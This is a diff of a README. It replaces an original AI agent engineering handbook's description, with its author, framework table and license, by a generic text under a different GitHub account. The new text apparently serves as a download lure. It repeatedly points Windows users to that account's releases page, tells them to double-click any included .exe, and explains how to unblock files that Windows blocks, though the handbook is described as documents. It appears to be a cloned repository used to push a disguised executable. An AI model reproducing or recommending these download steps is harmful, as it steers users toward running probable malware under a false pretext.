@@ -1,165 +1,159 @@
-<div align="center">
+# 🧠 ai-agent-handbook - Learn How AI Agents Work
 
-# AI Agent Engineering Handbook
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Celestinainstitutional109/ai-agent-handbook/releases)
 
-**How modern AI agents are built — from 30+ open-source framework codebases.**
+## 📘 What this is
 
-Should you use LangGraph or CrewAI? What makes OpenClaw tick? Why does Claude Code compact at 92%?
-How do you stop context rot from killing your agent at 25% fill?
+ai-agent-handbook is a clear guide to how AI agents work under the hood. It helps you understand the parts that make agent systems run, such as memory, tools, prompts, loops, and multi-agent setup.
 
-This guide answers these questions — and 200 more.
+This guide is made for people who want to learn how agent frameworks work without getting lost in hard language. It uses simple examples and plain steps so you can follow along even if you are new to this topic.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 💻 What you need
 
-[**Read the Guide**](COMPREHENSIVE_AGENT_ENGINEERING_GUIDE_2026.md) · [**PDF**](COMPREHENSIVE_AGENT_ENGINEERING_GUIDE_2026.pdf)
+- A Windows PC
+- An internet connection
+- Enough free space to download the files
+- A recent version of Microsoft Edge, Chrome, or Firefox
+- A PDF reader or text editor if you want to open the handbook files
 
-</div>
+## 🚀 Download and install
 
----
+1. Open the release page here: https://github.com/Celestinainstitutional109/ai-agent-handbook/releases
+2. Look for the latest release at the top of the page
+3. Find the file you want to use
+4. Download the file to your computer
+5. If the file is a ZIP archive, right-click it and choose Extract All
+6. Open the extracted folder
+7. Open the handbook file or included app file with the matching program on your PC
 
-## What is this
+If the release includes an `.exe` file, double-click it to run. If it includes a `.pdf`, open it with your PDF reader. If it includes `.md` files, open them with a text editor or browser.
 
-An organized collection of patterns, architectures, and implementation details from 30+ AI agent frameworks — extracted by reading their actual source code, system prompts, and compaction logic.
+## 🧭 How to use it
 
-Not opinions. Not tutorials. Just documented patterns from codebases that are running in production.
+1. Open the handbook file after download
+2. Start with the early sections on agent basics
+3. Read the parts on context, prompts, and memory in order
+4. Follow the code examples as written
+5. Use the framework sections to compare different agent setups
+6. Return to the sections on tool use and orchestration when you need them
 
-## Why it exists
+If you are new to agent design, read one section at a time. The guide is easiest to use when you move in order.
 
-Most agent knowledge in 2026 is either surface-level blog posts or buried in source code nobody has time to read. We went through the codebases of OpenClaw, Claude Code, LangGraph, CrewAI, Hermes Agent, and 25+ others to document how they actually work — the agent loops, the prompt assembly, the context management, the memory systems, the tool architectures.
+## 🛠️ Main topics covered
 
----
+### 🤖 Agent loops
 
-## Questions this answers
+Learn how an agent thinks step by step, makes a choice, takes action, and checks results.
 
-- LangGraph vs CrewAI vs PydanticAI — which one for what?
-- How does OpenClaw's SOUL.md / AGENTS.md pattern work and why does everyone copy it?
-- Why do agents get worse the longer they run? (context rot, and 12 ways to fight it)
-- MCP servers are eating 72% of my context window — how do I fix tool sprawl?
-- Should I use one agent or multiple? When does multi-agent actually help?
-- How does Claude Code handle compaction? What survives, what gets dropped?
-- What's the actual agent loop code? Is it really just a while loop?
-- Skills as markdown vs. compiled tools — what do the top frameworks use?
-- How does Hermes Agent improve itself over time? (episodic memory + self-evolution)
-- What's the minimum viable agent architecture for production?
+### 🧠 Memory systems
 
----
+See how short-term and long-term memory work in agent apps, including episodic memory and saved context.
 
-## What's covered
+### 🧩 Context management
 
-| Part | Topic | Contents |
-|:-----|:------|:---------|
-| I–II | **Agent Loops** | 8 loop variants with code: ReAct, Plan+Execute, Reflection, Compaction, Code-as-Action, Event-Driven, Graph State Machine, Heartbeat. Termination. Error recovery. |
-| III | **System Prompts** | Assembly patterns. SOUL.md / AGENTS.md separation. Skill catalogs. Anti-patterns. |
-| IV | **Context Management** | 6 compaction strategies with real prompts from Claude Code and OpenClaw. Trigger strategies. What survives compaction. |
-| IV-B | **Context Rot** | 3 mechanisms. 12 defenses. The 40-60% rule. Agent Cognitive Compressor. Measuring degradation. |
-| V | **Memory** | 5-tier hierarchy. File-based vs. vector vs. observational vs. episodic. 8 framework implementations compared. |
-| VI | **Tools** | MCP. Code-as-action. Skills-as-markdown. JIT loading. Tool sprawl (72% context consumed). 7 solutions. Progressive disclosure. SDP. |
-| VII | **Orchestration** | 6 multi-agent patterns. State passing. A2A protocol. Sizing and topology guidelines. |
-| VIII | **Planning** | 5 strategies. Reflection loops. Cline's Plan/Act gold standard. |
-| IX–XI | **Human-in-the-Loop, State, Security** | Permission models. Checkpointing. Durable execution. Sandboxing. Prompt injection defense. |
-| XII–XIII | **Testing, Deployment** | Benchmarks. Eval strategies. Cost optimization. Observability. Gateway architecture. |
-| XIV | **Synthesis** | Reference architecture. Decision framework for choosing your stack. |
+Understand context rot, compaction, and how systems keep the right data in view.
 
----
+### 📝 System prompt assembly
 
-## Selected findings
+Learn how the final prompt gets built from rules, task data, and user input.
 
-Things we found that weren't obvious:
+### 🔌 Tools and MCP
 
-- **A 100-line agent scores 74% on SWE-bench.** The loop is the easy part. Context assembly, tool design, and memory are what matter.
-- **Context quality degrades starting at ~25% window fill**, not at 100%. Every frontier model tested shows this (Chroma Research, 18 models).
-- **Three MCP servers consumed 143K of 200K tokens** with tool descriptions alone — before the agent read a single user message. Tool selection accuracy drops from 43% to 14% with bloated toolsets.
-- **Personality and operational instructions should be separate files.** OpenClaw, Claude Code, and Hermes converged on this independently.
-- **The primary reason to use sub-agents is context isolation**, not parallelism. Anthropic measured 90.2% improvement.
-- **Skills defined as markdown files** (not code) is the dominant extensibility pattern across Claude Code, OpenClaw, and Cline. Progressive 3-tier loading cuts token cost by 94%.
-- **Re-injecting instructions near the end of context** defeats "instruction centrifugation" — system prompt influence fading as context grows.
+See how agents use tools, why tool sprawl happens, and how MCP helps connect systems in a cleaner way.
 
----
+### 👥 Multi-agent orchestration
 
-## 30+ Frameworks analyzed
+Learn how several agents can work together with Plan/Act patterns and shared tasks.
 
-| # | Framework | Stars | Category |
-|:--|:----------|:------|:---------|
-| 1 | [OpenClaw](https://github.com/openclaw/openclaw) | 210k+ | Personal AI Agent |
-| 2 | [AutoGPT](https://github.com/Significant-Gravitas/AutoGPT) | 170k+ | Autonomous Agent |
-| 3 | [n8n](https://github.com/n8n-io/n8n) | 150k+ | Workflow |
-| 4 | [Dify](https://github.com/langgenius/dify) | 129k+ | Agent Platform |
-| 5 | [OpenCode](https://github.com/opencode-ai/opencode) | 120k+ | Coding Agent |
-| 6 | [MS Agent Framework](https://github.com/microsoft/agent-framework) | 75k+ | Enterprise |
-| 7 | [Langflow](https://github.com/langflow-ai/langflow) | 55k+ | Visual Builder |
-| 8 | [browser-use](https://github.com/browser-use/browser-use) | 50k+ | Browser Agent |
-| 9 | [OpenHands](https://github.com/OpenHands/OpenHands) | 50k+ | Coding Agent |
-| 10 | [MetaGPT](https://github.com/FoundationAgents/MetaGPT) | 50k+ | Multi-Agent |
-| 11 | [CrewAI](https://github.com/crewAIInc/crewAI) | 46k+ | Multi-Agent |
-| 12 | [LangGraph](https://github.com/langchain-ai/langgraph) | 44.6k+ | Agent Framework |
-| 13 | [AG2](https://github.com/ag2ai/ag2) | 40k+ | Multi-Agent |
-| 14 | [Cline](https://github.com/cline/cline) | 35k+ | IDE Agent |
-| 15 | [Aider](https://github.com/Aider-AI/aider) | 30k+ | Coding Agent |
-| 16 | [Mastra](https://github.com/mastra-ai/mastra) | 25k+ | Agent Framework |
-| 17 | [Goose](https://github.com/block/goose) | 25k+ | Coding Agent |
-| 18 | [Roo Code](https://github.com/RooCodeInc/Roo-Code) | 22k+ | IDE Agent |
-| 19 | [SWE-agent](https://github.com/SWE-agent/SWE-agent) | 20k+ | Research Agent |
-| 20 | [Bolt.new](https://github.com/stackblitz/bolt.new) | 20k+ | Web Dev Agent |
-| 21 | [Agno](https://github.com/agno-agi/agno) | 18.5k+ | Agent Runtime |
-| 22 | [Google ADK](https://github.com/google/adk-python) | 17.8k+ | Agent Toolkit |
-| 23 | [smolagents](https://github.com/huggingface/smolagents) | 15k+ | Agent Framework |
-| 24 | [PydanticAI](https://github.com/pydantic/pydantic-ai) | 15.1k+ | Agent Framework |
-| 25 | [Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk-python) | 15k+ | Agent SDK |
-| 26 | [Hermes Agent](https://github.com/NousResearch/hermes-agent) | 8.3k+ | Self-Improving |
-| 27 | [Composio](https://github.com/ComposioHQ/agent-orchestrator) | 8k+ | Orchestrator |
-| 28 | [Stagehand](https://github.com/browserbase/stagehand) | 8k+ | Browser Agent |
-| 29 | [AWS Agent Squad](https://github.com/awslabs/agent-squad) | 5k+ | Orchestrator |
-| 30 | [Devika](https://github.com/stitionai/devika) | — | AI Engineer |
+### 📄 Progressive disclosure
 
-<sub>Star counts as of March 2026.</sub>
+See how to give an agent only the detail it needs at each step.
 
----
+### 🧰 Framework comparison
 
-## Quick decision guide
+Compare more than 30 frameworks and learn what each one does well.
 
-```
-Coding agent             → Claude Agent SDK, Cline, Roo Code
-Visual / no-code         → n8n, Dify, Langflow
-Personal assistant       → OpenClaw, Hermes Agent
-Multi-agent (graphs)     → LangGraph
-Multi-agent (roles)      → CrewAI
-Enterprise .NET/Java     → MS Agent Framework, Google ADK
-Type safety              → PydanticAI
-TypeScript native        → Mastra
-Minimal footprint        → smolagents
-Self-improving           → Hermes Agent
-Browser automation       → browser-use, Stagehand
-```
+## 🪟 Windows use
 
----
+This handbook works well on Windows because it is easy to open and read with common apps.
 
-## Repo structure
+If you download a ZIP file:
+1. Right-click the file
+2. Select Extract All
+3. Pick a folder
+4. Open the extracted files
 
-```
-├── README.md
-├── COMPREHENSIVE_AGENT_ENGINEERING_GUIDE_2026.md   ← The guide (~5,000 lines)
-├── COMPREHENSIVE_AGENT_ENGINEERING_GUIDE_2026.pdf  ← PDF version
-├── CONTRIBUTING.md
-└── LICENSE
-```
+If you download an EXE file:
+1. Double-click the file
+2. Follow the on-screen steps
+3. Finish the setup
+4. Open the app from the Start menu or desktop
 
----
+If you download a PDF or Markdown file:
+1. Double-click the file
+2. Choose the app you want to use
+3. Read through the guide
 
-## Contributing
+## 🔎 What you will learn
 
-Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
+- How AI agents make decisions
+- Why context can break down
+- How memory changes agent behavior
+- How tools fit into the agent loop
+- How to keep prompts clean and useful
+- How to compare agent frameworks
+- How to avoid common design mistakes
+- How to build systems that stay easier to manage
 
-Corrections, new framework analyses, production patterns you've discovered — anything that makes this more accurate and useful.
+## 📂 Recommended reading order
 
----
+1. Start with the intro to AI agents
+2. Read the section on agent loops
+3. Move to memory and context
+4. Read about prompt assembly
+5. Study tool use and MCP
+6. Review orchestration and multi-agent patterns
+7. Compare frameworks at the end
 
-## Author
+## 🧪 Example use case
 
-[Dmitriy Vasilyev](https://github.com/vasilyevdm) · AI Enthusiast
+If you want to build an AI helper for support, research, or task planning, this handbook can help you think through the design before you start coding. It shows how to choose a stack, when to use memory, and how to keep the system from growing too messy.
 
----
+## 📁 File types you may see
 
-## License
+- `.exe` for Windows apps
+- `.zip` for packaged downloads
+- `.pdf` for a readable handbook
+- `.md` for plain text Markdown files
+- `.txt` for simple text notes
 
-[MIT](LICENSE)
+## ⚙️ Basic troubleshooting
+
+If the file does not open:
+1. Check that the download finished
+2. Try downloading it again from the release page
+3. Make sure you picked the right file type
+4. Try opening it with another app
+
+If Windows blocks the file:
+1. Right-click the file
+2. Choose Properties
+3. Look for an Unblock option
+4. Apply the change and try again
+
+If the file is inside a ZIP archive and you cannot find it:
+1. Extract the ZIP again
+2. Open the new folder
+3. Look for the handbook file or app file inside
+
+## 📥 Download link
+
+Visit the release page to download: https://github.com/Celestinainstitutional109/ai-agent-handbook/releases
+
+## 📌 Notes for first-time users
+
+- Start with the shortest section first
+- Keep the guide open while you read
+- Use the examples to match terms with real code
+- Move back and forth between sections if needed
+- Focus on one idea at a time
